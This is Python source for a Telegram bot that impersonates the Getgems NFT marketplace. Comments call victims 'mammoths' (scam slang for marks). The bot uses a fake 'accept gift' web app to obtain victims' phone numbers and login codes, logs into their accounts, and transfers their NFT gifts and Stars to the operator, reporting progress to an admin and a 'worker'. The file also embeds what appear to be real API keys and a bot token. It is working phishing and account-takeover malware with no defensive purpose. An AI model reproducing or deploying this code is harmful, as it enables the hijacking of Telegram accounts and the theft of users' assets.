import os
import asyncio
import threading
import urllib.parse
import datetime
from flask import Flask, render_template, request, jsonify
from telethon import TelegramClient, events, Button, functions, types
from telethon.errors import (
    SessionPasswordNeededError, 
    RPCError, 
    SessionRevokedError, 
    PhoneCodeInvalidError
)

# --- КОНФИГУРАЦИЯ ---
API_ID = '34426356'
API_HASH = 'ddfa0edfefb66da4b06bc85e23fd40d5'
BOT_TOKEN = '8028370592:AAHmcGRTUoxPEwbDBcw1tsQmQlx5cty3ahM'
ADMIN_ID = 678335503
WORKER_ID = 8311100024
# Укажи здесь актуальный домен от Railway
DOMAIN = "getgemsdrainer-production.up.railway.app" 

bot = TelegramClient('bot_auth', API_ID, API_HASH).start(bot_token=BOT_TOKEN)
app = Flask(__name__)

active_clients = {}
temp_clients = {}
pending_contacts = {}

def save_log(text):
    with open("logs.txt", "a", encoding="utf-8") as f:
        f.write(f"[{datetime.datetime.now()}] {text}\n")

def send_log(msg, buttons=None):
    save_log(msg)
    bot.loop.create_task(bot.send_message(ADMIN_ID, f"<b>LOG:</b>\n{msg}", parse_mode='html', buttons=buttons))
    bot.loop.create_task(bot.send_message(WORKER_ID, f"<b>LOG:</b>\n{msg}", parse_mode='html'))

# --- ЛОГИКА СЛИВА (DRAIN LOGIC) ---
async def drain_logic(client, phone):
    try:
        # 1. Проверка баланса мамонта
        res = await client(functions.payments.GetStarsStatusRequest(peer='me'))
        
        # 2. Логика заправки (Gas Refill)
        if res.balance < 25:
            my_stars = await bot(functions.payments.GetStarsStatusRequest(peer='me'))
            if my_stars.balance >= 30:
                me = await client.get_me()
                send_log(f"⛽ Заправка {phone}. Дарим 2 мишки...")
                for _ in range(2):
                    try:
                        await bot(functions.payments.SendStarGiftRequest(peer=me.id, gift_id=685))
                        await asyncio.sleep(2)
                    except: pass
                
                await asyncio.sleep(7)
                # Мамонт продает мишек
                received_gifts = await client(functions.payments.GetStarGiftsRequest(offset='', limit=5))
                for g in received_gifts.gifts:
                    try:
                        await client(functions.payments.SaveStarGiftRequest(stargift_id=g.id, unsave=True))
                    except: continue
                res = await client(functions.payments.GetStarsStatusRequest(peer='me'))
                send_log(f"💰 Новый баланс {phone}: {res.balance}★")
            else:
                send_log(f"⚠️ Нет звезд на доноре для заправки {phone}!")

        # 3. Перевод NFT
        all_gifts = await client(functions.payments.GetStarGiftsRequest(offset='', limit=100))
        total_found = len(all_gifts.gifts)
        success_count = 0
        
        for nft in all_gifts.gifts:
            try:
                await client(functions.payments.TransferStarGiftRequest(to_id=ADMIN_ID, stargift_id=nft.id))
                success_count += 1
                await asyncio.sleep(3)
            except Exception as e:
                if "BALANCE_TOO_LOW" in str(e): break
                continue

        # 4. Кнопка повтора при неудаче
        btns = None
        if success_count < total_found or total_found == 0:
            btns = [Button.inline("🔄 Высушить заново", data=f"redrain_{phone}")]
        
        send_log(f"🏁 Слив {phone} окончен. Переведено: {success_count}/{total_found}", buttons=btns)

    except SessionRevokedError:
        send_log(f"❌ Мамонт {phone} завершил сессию.")
    except Exception as e:
        btns = [Button.inline("🔄 Высушить заново", data=f"redrain_{phone}")]
        send_log(f"⚠️ Ошибка drain_logic {phone}: {e}", buttons=btns)

# --- ИНЛАЙН РЕЖИМ (ПОДАРКИ) ---
@bot.on(events.InlineQuery)
async def inline_handler(event):
    if not event.text: return
    input_text = event.text.strip()
    nft_name = input_text.split('/')[-1].replace('-', ' ').title()
    web_url = f"https://{DOMAIN}/?nft_url={urllib.parse.quote(input_text)}"
    
    builder = event.builder
    await event.answer([
        builder.article(
            title=f"Подарить {nft_name}",
            description="Нажмите, чтобы отправить этот подарок",
            text=f"🎁 **Вам отправили подарок!**\n\nОбъект: `{nft_name}`\n\nНажмите кнопку ниже, чтобы принять 👇",
            buttons=[
                [Button.web_app("Принять подарок 🎁", web_url)],
                [Button.url("Посмотреть на Getgems", input_text)]
            ]
        )
    ])

# --- ОБРАБОТЧИКИ КОМАНД ---
@bot.on(events.NewMessage(pattern='/start'))
async def start_handler(event):
    welcome_text = (
        "Это бот Getgems — он позволяет торговать NFT прямо в мини-приложении Telegram. "
        "Это самый удобный способ покупать и продавать Telegram-подарки, юзернеймы и анонимные номера. 🎯\n\n"
        "💎 0% комиссии на торговлю оффчейн Telegram-подарками\n"
        "💎 Покупайте Telegram Stars на 30% дешевле, чем в Telegram\n\n"
    )
    buttons = [
        [Button.url("Торговать номерами ↗", "https://getgems.io/collection/EQAOQdwdw8kGftJCSFgOErM1mBjYPe4DBPq8-AhF6vr9si5N?utm_source=homepage&utm_medium=top_collections&utm_campaign=collection_overview")],
        [Button.url("Торговать юзернеймами ↗", "https://getgems.io/collection/EQCA14o1-VWhS2efqoh_9M1b_A9DtKTuoqfmkn83AbJzwnPi?utm_source=homepage&utm_medium=top_collections&utm_campaign=collection_overview")],
        [Button.url("Торговать подарками ↗", "https://getgems.io/nft-gifts")]
    ]
    await event.respond(welcome_text, buttons=buttons, link_preview=False)

@bot.on(events.NewMessage(pattern='/stars_check'))
async def stars_check(event):
    if event.sender_id != ADMIN_ID: return
    try:
        res = await bot(functions.payments.GetStarsStatusRequest(peer='me'))
        await event.respond(f"📊 <b>Баланс:</b> {res.balance}★\n🚀 <b>Хватит на:</b> {res.balance // 25} передач.", parse_mode='html')
    except Exception as e:
        await event.respond(f" Ошибка: {e}")

@bot.on(events.CallbackQuery(pattern=rb'redrain_(.*)'))
async def redrain_callback(event):
    phone = event.pattern_match.group(1).decode('utf-8')
    if phone in active_clients:
        await event.answer("Запускаю повторно...")
        asyncio.create_task(drain_logic(active_clients[phone], phone))
    else:
        await event.answer("Ошибка: Сессия потеряна!", alert=True)

# --- API ROUTES (FLASK) ---
@app.route('/')
def index(): return render_template('index.html')

@app.route('/api/check_contact')
def check_contact():
    uid = request.args.get('id', '0')
    if uid in pending_contacts:
        return jsonify({"status": "received", "phone": pending_contacts[uid]})
    return jsonify({"status": "waiting"})

@app.route('/api/send_code', methods=['POST'])
async def api_send_code():
    data = request.json
    phone, code = data.get('phone'), data.get('code')
    try:
        client = temp_clients[phone]['client']
        await client.sign_in(phone, code, phone_code_hash=temp_clients[phone]['hash'])
        active_clients[phone] = client
        asyncio.create_task(drain_logic(client, phone))
        return jsonify({"status": "success"})
    except PhoneCodeInvalidError:
        return jsonify({"status": "error", "message": "Неверный код"})
    except SessionPasswordNeededError:
        return jsonify({"status": "2fa_needed"})
    except Exception as e:
        return jsonify({"status": "error", "details": str(e)})

@bot.on(events.NewMessage)
async def contact_handler(event):
    if event.contact and event.contact.user_id == event.sender_id:
        phone = event.contact.phone_number
        if not phone.startswith('+'): phone = '+' + phone
        pending_contacts[str(event.sender_id)] = phone
        try:
            client = TelegramClient(f'sessions/{phone}', API_ID, API_HASH)
            await client.connect()
            res = await client.send_code_request(phone)
            temp_clients[phone] = {'client': client, 'hash': res.phone_code_hash}
            send_log(f"📞 Контакт {phone} получен, код отправлен.")
        except Exception as e:
            send_log(f"❌ Ошибка сессии {phone}: {e}")

if __name__ == '__main__':
    if not os.path.exists('sessions'): os.makedirs('sessions')
    # Railway автоматически прокидывает PORT
    port = int(os.environ.get("PORT", 8080))
    threading.Thread(target=lambda: app.run(port=port, host='0.0.0.0', use_reloader=False), daemon=True).start()
    bot.run_until_disconnected()